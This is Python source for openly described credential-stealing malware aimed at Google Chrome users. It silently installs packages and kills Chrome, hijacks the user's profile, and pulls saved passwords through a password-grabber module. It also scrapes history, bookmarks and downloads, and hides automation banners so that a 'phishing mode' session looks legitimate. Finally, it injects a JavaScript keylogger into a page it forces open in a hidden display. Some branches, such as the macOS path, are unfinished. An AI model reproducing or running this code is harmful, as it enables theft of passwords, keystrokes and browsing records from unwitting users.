import platform
import os
from importlib import import_module
import get_pwds
import time
import json
import sys

	
"""
This function installs all non-native libs, and then dynamically imports them for running in the program.
"""

def SILENT_INSTALL(package):
	try:
		os.popen("python3 -m pip install "+package).read()
		globals()[package] = __import__(package)
	except Exception as e:
		print("An error occurred:\n"+str(e))
		pass
	
	# from selenium import webdriver
	if package == "selenium":
		webdriver = import_module("selenium.webdriver")
	
		return webdriver
		
	return 0


"""
This function gets the path to the chrome profile user data,
which the malware can then piggyback to gain privileges.
"""

# kill all running chrome processes to prevent profile-in-use error
def KILL_ALL():
	system = platform.system()
	
	if system == "Windows":
		os.popen("taskkill /f /im chrome.exe").read()
	if system == "Linux":
		os.popen("killall chrome").read()
	if system == "Darwin":
		path = ""
		os.popen().read()
		
	return 0
	
	
def GET_USR_DATA():
	uname = os.popen("whoami").read()
	
	KILL_ALL()
	
	system = platform.system()
	if system == "Windows":
		SILENT_INSTALL("win32crypt")
	
		# split required windows-only because of domain output
		path = "C:\\Users\\"+uname.split("\\")[1].strip()+"\\AppData\\Local\\Google\\Chrome\\User Data"
	if system == "Linux":
		path = "/home/"+uname.strip()+"/.config/google-chrome"
	if system == "Darwin":
		path = ""
		os.popen().read()
		
		"""
		TODO: NEED MACOS TESTING
		"""
	return path


# get user passwords from chrome.py, and format them
# Password chrome.py file from https://github.com/priyankchheda/chrome_password_grabber
def GET_PWD():
	
	# we will store passes/unames here
	passwords = []
	usernames = []
	urls = []

	data = json.loads(get_pwds.bot())
	for i in range(len(data["data"])):
		passwords.append(data["data"][i]["password"])
		usernames.append(data["data"][i]["username"])
		urls.append(data["data"][i]["url"])
	
	return passwords, usernames, urls
	

# grab user history and return to attacker
def GET_HISTORY():
	driver = webdriver.Chrome(options=options)

	driver.get("chrome://history")
	
	# account for unusual speed in headless
	time.sleep(1)
	
	# 'hack' into Chrome's DOM injection using JS
	open_shadow = driver.execute_script('''
	return document.querySelector('#history-app').shadowRoot.querySelector('#history').shadowRoot.querySelector('#infinite-list').getAttribute('aria-owns');
	''')
	
	history_items = open_shadow.split(' ')
	titles = []
	domains = []
	
	for site in history_items:
		# each dynamically injected DOM for the history item must be retrieved and parsed
		get_shadow_info = driver.execute_script("""
		return document.querySelector('#history-app').shadowRoot.querySelector('#history').shadowRoot.querySelector('#infinite-list').querySelector('#"""+site+"""').shadowRoot;
		""")
		
		titles.append(get_shadow_info.find_element_by_class_name('website-title').text)
		domains.append(get_shadow_info.find_element_by_id('domain').text)
		
	driver.close()
		
	return [titles, domains]
		
		
def GET_BOOKMARKS():
	driver = webdriver.Chrome(options=options)
	driver.get("chrome://bookmarks")
	
	# account for unusual speed in headless
	time.sleep(1)
	
	# would be much better as a function, but script differs extremely every time...
	open_shadow =  driver.execute_script("""
	return document.querySelector('bookmarks-app').shadowRoot.querySelector('bookmarks-list').shadowRoot.querySelector('#list').getAttribute('aria-owns');
	""")
	
	bookmarked_items = open_shadow.split(' ')
	
	titles = []
	links = []
	
	for bookmark in bookmarked_items:
		get_shadow_info = driver.execute_script("""
		return document.querySelector('bookmarks-app').shadowRoot.querySelector('bookmarks-list').shadowRoot.querySelector('#list').querySelector('#"""+bookmark+"""').shadowRoot;
		""")
		
		titles.append(get_shadow_info.find_element_by_id('website-title').text)
		links.append(get_shadow_info.find_element_by_id('website-url').get_attribute('title'))
	
	driver.close()
	return [titles, links]


def GET_DOWNLOADS():
	driver = webdriver.Chrome(options=options)
	driver.get("chrome://downloads")
	
	# account for unusual speed in headless
	time.sleep(1)
	
	# Here we go again (in Mario voice)
	open_shadow = driver.execute_script('''
	return document.querySelector('downloads-manager').shadowRoot.querySelector('#downloadsList').getAttribute('aria-owns')
	''')
	
	downloaded_items = open_shadow.split(' ')
	titles = []
	links = []
	
	for download in downloaded_items:
		get_shadow_info= driver.execute_script('''
		return document.querySelector('downloads-manager').shadowRoot.querySelector('#downloadsList').querySelector('#'''+download+'''').shadowRoot;
		''')
		
		titles.append(get_shadow_info.find_element_by_id('file-link').text)
		links.append(get_shadow_info.find_element_by_id('file-link').get_attribute('href'))
		
	driver.close()
	return [titles, links]
	
	
def SESSION_ENDED(stamp):
	try:
		if (stamp[0]['level']):
			if stamp[0]['level'] == 'WARNING':
				return True
			
	except IndexError:
		return False
	
	
def FORCED_REDIR(url, keylogger):
	display.stop()
	
	options = webdriver.ChromeOptions()
	
	path_to_profile = GET_USR_DATA()
	
	# keep-alive tab
	options.add_experimental_option("detach", True)
	
	# piggyback the existing chrome profile to recover data
	options.add_argument('--user-data-dir='+path_to_profile)
	options.add_argument('--profile-directory=Profile 1')
	
	# get rid of "Chrome is running in Testing Environment" infobar
	# to make user think session in phishing mode is legit.
	
	options.add_experimental_option("excludeSwitches",["enable-automation"])
	
	
	# start new websession
	driver = webdriver.Chrome(options=options)
	driver.get(str(url))
	
	old_tab = driver.current_url
	
	loaded = False
	while loaded == False:
		# initialise a JS keylogger (to not block loop here)
		if (driver.execute_script("return document.readyState") == "complete"):
			driver.execute_script("""
    				document.body.innerHTML += `<input type="hidden" id="keys"/>`;
        
				document.body.setAttribute('onkeyup', 'document.getElementById("keys").value += event.key;');
			""")
		
			loaded = True
	
	all_keys = ""
	
	while True:
		# recover keypresses so far from js
		try:
			if (driver.execute_script("return document.readyState") == "complete"):
				all_keys = driver.execute_script("""return document.getElementById('keys').value""")
			else:
				print("\nREDIR: keylogger passing until page fully loaded.")
			
			# necessary because of non-built in selenium
			# get keys function. Instead we must rely on a loop and injected js
			old_keys = all_keys
		except:
			all_keys = old_keys
			
		ended = SESSION_ENDED(driver.get_log('driver'))
		
		if ended == True:
			if keylogger == True:
				return [all_keys]
			else:
				return True
			
			break
			
		time.sleep(5)
		
webdriver = SILENT_INSTALL("selenium")
SILENT_INSTALL("pyvirtualdisplay")

options = webdriver.ChromeOptions()

# OS-specific: get path to chrome profile data
path_to_profile = GET_USR_DATA()

# piggyback the existing chrome profile to recover data
options.add_argument('--user-data-dir='+path_to_profile)
options.add_argument('--profile-directory=Profile 1')
	
# get rid of "Chrome is running in Testing Environment" infobar
# to make user think session in phishing mode is legit.
	
options.add_experimental_option("useAutomationExtension", False)
options.add_experimental_option("excludeSwitches",["enable-automation"])

# hide tab from user
# we can't use headless flag because of chrome bug where JS execution is dis-allowed
display = pyvirtualdisplay.Display(visible=0, size=(800, 600))
display.start()

KILL_ALL()
		